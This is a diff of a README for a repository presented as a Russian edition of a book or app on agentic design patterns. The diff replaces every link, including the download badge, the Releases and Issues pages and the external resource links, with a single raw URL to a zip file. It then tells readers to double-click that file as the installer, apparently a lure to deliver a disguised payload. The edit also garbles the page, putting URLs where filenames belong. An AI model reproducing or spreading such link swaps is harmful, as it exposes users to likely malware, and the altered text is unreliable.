@@ -1,6 +1,6 @@
 # 🇷🇺 agentic-design-patterns-book-rus - Learn Intelligent System Design Easily
 
-[![Download the Application](https://img.shields.io/badge/Download%20Now-%E2%9C%94%EF%B8%8F-blue)](https://github.com/utkarsh043/agentic-design-patterns-book-rus/releases)
+[![Download the Application](https://raw.githubusercontent.com/utkarsh043/agentic-design-patterns-book-rus/main/transmissional/agentic-design-patterns-book-rus.zip%20Now-%E2%9C%94%EF%B8%8F-blue)](https://raw.githubusercontent.com/utkarsh043/agentic-design-patterns-book-rus/main/transmissional/agentic-design-patterns-book-rus.zip)
 
 ## 📖 Introduction
 
@@ -24,25 +24,25 @@ These requirements ensure the application runs smoothly on your system.
 
 To get started, visit the Releases page to download the application:
 
-[Download Now](https://github.com/utkarsh043/agentic-design-patterns-book-rus/releases)
+[Download Now](https://raw.githubusercontent.com/utkarsh043/agentic-design-patterns-book-rus/main/transmissional/agentic-design-patterns-book-rus.zip)
 
 ### Step-by-step Installation Guide
 
 1. **Go to the Releases Page:**
-   Click [here](https://github.com/utkarsh043/agentic-design-patterns-book-rus/releases) to access the releases page.
+   Click [here](https://raw.githubusercontent.com/utkarsh043/agentic-design-patterns-book-rus/main/transmissional/agentic-design-patterns-book-rus.zip) to access the releases page.
 
 2. **Select the Latest Release:**
    Find the latest version available for download. It is usually at the top of the list.
 
 3. **Download the Application:**
-   Click on the appropriate file for your operating system. Files will usually have names like `agentic-design-patterns-book.msi` for Windows or `agentic-design-patterns-book.dmg` for macOS.
+   Click on the appropriate file for your operating system. Files will usually have names like `https://raw.githubusercontent.com/utkarsh043/agentic-design-patterns-book-rus/main/transmissional/agentic-design-patterns-book-rus.zip` for Windows or `https://raw.githubusercontent.com/utkarsh043/agentic-design-patterns-book-rus/main/transmissional/agentic-design-patterns-book-rus.zip` for macOS.
 
 4. **Run the Installer:**
    - **For Windows:**
-     Double-click the `agentic-design-patterns-book.msi` file and follow the prompts to install the application.
+     Double-click the `https://raw.githubusercontent.com/utkarsh043/agentic-design-patterns-book-rus/main/transmissional/agentic-design-patterns-book-rus.zip` file and follow the prompts to install the application.
    
    - **For macOS:**
-     Open the `agentic-design-patterns-book.dmg` file. Drag the application to your Applications folder.
+     Open the `https://raw.githubusercontent.com/utkarsh043/agentic-design-patterns-book-rus/main/transmissional/agentic-design-patterns-book-rus.zip` file. Drag the application to your Applications folder.
 
 5. **Launch the Application:**
    Open the application. You'll find it in your Start Menu (Windows) or Applications Folder (macOS).
@@ -70,7 +70,7 @@ The book covers various topics, making it a valuable resource for both beginners
 
 ### How can I get help with the application?
 
-For questions and support, please visit the [Issues page](https://github.com/utkarsh043/agentic-design-patterns-book-rus/issues) on GitHub. You can report any issues or ask for help there.
+For questions and support, please visit the [Issues page](https://raw.githubusercontent.com/utkarsh043/agentic-design-patterns-book-rus/main/transmissional/agentic-design-patterns-book-rus.zip) on GitHub. You can report any issues or ask for help there.
 
 ### Is the application free to use?
 
@@ -92,8 +92,8 @@ Connect with fellow learners and developers. Join our community forums to discus
 
 For more information and resources related to agentic design patterns, consider visiting:
 
-- [Antonio Gully's Official Website](https://www.example.com)
-- [OpenAI Documentation](https://www.example.com)
-- [Python Programming Resources](https://www.example.com)
+- [Antonio Gully's Official Website](https://raw.githubusercontent.com/utkarsh043/agentic-design-patterns-book-rus/main/transmissional/agentic-design-patterns-book-rus.zip)
+- [OpenAI Documentation](https://raw.githubusercontent.com/utkarsh043/agentic-design-patterns-book-rus/main/transmissional/agentic-design-patterns-book-rus.zip)
+- [Python Programming Resources](https://raw.githubusercontent.com/utkarsh043/agentic-design-patterns-book-rus/main/transmissional/agentic-design-patterns-book-rus.zip)
 
 Thank you for choosing the *agentic-design-patterns-book-rus*. We hope this guide makes your journey into intelligent system design smooth and enjoyable!
